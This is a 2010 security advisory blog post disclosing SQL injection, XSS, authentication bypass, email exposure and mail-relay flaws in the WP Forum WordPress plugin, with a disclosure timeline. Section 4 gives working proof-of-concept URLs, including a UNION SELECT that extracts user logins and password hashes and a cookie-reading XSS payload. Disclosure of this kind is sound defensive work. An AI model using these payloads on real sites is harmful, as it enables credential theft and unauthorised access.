---
title: Multiple Vulnerabilities in WP Forum (WordPress Plugin)
author: Charles Hooper
comments: true
layout: post
permalink: /blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/
has_been_twittered:
  - yes
categories:
  - Advisories
---
# 

# Multiple Vulnerabilities in WP Forum (WordPress Plugin)

## 1. Advisory Information

Title: Multiple Vulnerabilities in WP-Forum  
Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/  
Date Published: 12/17/2010  
Vendors Contacted: WordPress. Maintainer of plugin is unreachable.

## 2. Summary

WP Forum is a plugin for the popular blog tool and publishing platform, WordPress.  
The author of WP Forum describes it as a “Simple discussion forum plugin” and  
“easy to use and administer.”

There exist multiple vulnerabilities in WP Forum. Basically, input validation is not  
performed at all resulting in SQL injection, stored XSS, and reflected XSS vulns.

Furthermore, the author wrote the plugin under the assumption that it would only be  
executed within the context of the WordPress administrative panel, thereby neglecting  
to perform proper authentication and authorization.

## 3. Vulnerability Information

Packages/Versions Affected: Probably all, but confirmed only on WP Forum 1.7.8

3a. Type:   SQL Injection \[CWE-89\]  
3a. Impact: Read application data, bypass protection mechanism,  
modify application data. There are multiple SQL injections present  
in WP Forum. The most prominent of which is the SQL injection present  
in the \`group_login\` functionality. Prior to logging in, an attacker  
can retrieve each group’s passwords due to the vulnerability listed  
below (3b).

3b. Type:   Plaintext Storage of a Password \[CWE-256\]  
3b. Impact: Password is easily retrieved from database

3c. Type:   XSS (Stored or Reflected) \[CWE-79\]  
3c. Impact: Execute unauthorized code or commands

3d. Type:   Auth Bypass via Direct Request \[CWE-425\]  
3d. Impact: Many or all of the administrative functions assume they are running  
in the context of the WordPress administrative section. As a result,  
they often do not check that the user is authenticated or authorized  
to perform a particular action. Example functionality includes adding  
or removing forum moderators and deleting forums. This vulnerability  
could lead to information exposure, privilege escalation, or data loss.

3e. Type:   Information Exposure Through Sent Data \[CWE-201\]  
3e. Impact: \`sendmail.php\` discloses users’ email addresses by accepting a user-  
provider “user” variable and returns a hidden  tag containing  
that user’s email address.

3f. Type:   External Control of Assumed-Immutable Web Parameter \[CWE-472\]  
3f. Impact: \`sendmail.php\` accepts user-provided input allowing it to be used as  
an email relay

## 4. PoC & Technical Description

Due to the number of vulnerabilities in this package, I will not discuss each one  
individually. Instead, here are some sample POCs. Many more exploitable vulns exist  
in this package than what I am providing here.

4a. http://path.to/wordpress/?page\_id=&forumaction=group\_login&group\_id=0 UNION SELECT CONCAT\_WS(CHAR(58),user\_login,user\_pass,user\_email) FROM wp\_users LIMIT 1 #  
or (goes for all POCs): http://path.to/wordpress/?forumaction=group\_login&group\_id=0 UNION SELECT CONCAT\_WS(CHAR(58),user\_login,user\_pass,user\_email) FROM wp_users LIMIT 1 #  
4b. N/A  
4c. http://path.to/wordpress/?forumaction=group\_login&group\_id=alert(document.cookie);  
4d. http://path.to/wordpress/wp-content/plugins/wpforum/wp-forum-manage.php?editgroupsubmit=true&group=&groupname=&passwd=  
4e. http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php?user= (email address will be in HTML source)  
4f. POST ‘submit=true&sender=&email=&message=&subject=&replyto=  
to http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php (untested)

## 5. Report Timeline

12/10/2010 Initial email sent to WordPress security.  
12/10/2010 Maintainer not yet contacted as project appears abandoned and maintainer  
does not have listed contact information.  
12/17/2010 No reply from WordPress security. Advisory released.

## 6. References

6a. The WordPress Plugin page for WP Forum:

http://wordpress.org/extend/plugins/wpforum/

6b. The WordPress Profile page for the author of the plugin:

http://profiles.wordpress.org/users/fahlstad/

6c. The plugin author’s website:

http://www.fahlstad.se/

## 7. Legalese

This vulnerability report by Charles Hooper < chooper@plumata.com > is  
licensed under a Creative Commons Attribution-NonCommercial-ShareAlike  
3.0 Unported License.

## 8. Signature

Public Key: Obtainable via pool.sks-keyservers.net
